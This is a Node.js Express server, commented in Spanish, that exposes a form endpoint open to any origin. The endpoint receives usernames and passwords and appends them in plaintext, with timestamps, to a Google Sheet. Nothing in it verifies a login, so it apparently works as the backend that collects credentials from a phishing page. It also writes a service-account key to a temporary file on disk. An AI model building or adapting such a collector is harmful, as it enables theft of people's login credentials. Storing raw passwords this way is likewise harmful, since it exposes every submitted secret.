import express from "express";
import bodyParser from "body-parser";
import cors from "cors";
import fs from "fs";
import { google } from "googleapis";
import dotenv from "dotenv";


let keyFilePath = "./service-account-temp.json";

dotenv.config();
const app = express();

// ✅ Habilitar CORS para cualquier origen (puedes restringirlo si quieres)
app.use(cors({
  origin: "*", // o por seguridad: ["http://localhost:5173"]
  methods: ["GET", "POST", "OPTIONS"],
  allowedHeaders: ["Content-Type"],
}));

app.use(bodyParser.json());

if (process.env.SERVICE_ACCOUNT_KEY) {
  fs.writeFileSync(keyFilePath, process.env.SERVICE_ACCOUNT_KEY);
}

const KEYFILE = keyFilePath;
const MODE = process.env.MODE || "sheets";
const SHEET_ID = process.env.SHEET_ID;
const DRIVE_FILE_ID = process.env.DRIVE_FILE_ID;

if (!fs.existsSync(KEYFILE)) {
  console.error("❌ No se encontró la clave de la service account.");
  process.exit(1);
}

// 🔐 Autenticación Google
const auth = new google.auth.GoogleAuth({
  keyFile: KEYFILE,
  scopes: [
    "https://www.googleapis.com/auth/drive",
    "https://www.googleapis.com/auth/spreadsheets",
  ],
});

async function appendToSheet(userData) {
  const client = await auth.getClient();
  const sheets = google.sheets({ version: "v4", auth: client });

  const values = [[userData.usuario, userData.password, new Date().toISOString()]];

  await sheets.spreadsheets.values.append({
    spreadsheetId: SHEET_ID,
    range: "Hoja 1!B3:C3", // 🔧 Ajusta según tu hoja
    valueInputOption: "RAW",
    requestBody: { values },
  });
}

// 📩 Endpoint del formulario
app.post("/api/form", async (req, res) => {
  try {
    const { usuario, password } = req.body;

    if (!usuario || !password) {
      return res.status(400).json({ message: "Faltan datos (usuario o contrasena)" });
    }

    if (MODE === "sheets") {
      await appendToSheet({ usuario, password });
      return res.status(200).json({ message: "Datos guardados en Google Sheets ✅" });
    } else {
      return res.status(200).json({ message: "Datos recibidos, modo Excel no implementado aún." });
    }
  } catch (err) {
    console.error("❌ Error:", err.message);
    res.status(500).json({ message: "Error al guardar los datos", error: err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Servidor corriendo en http://localhost:${PORT}`));
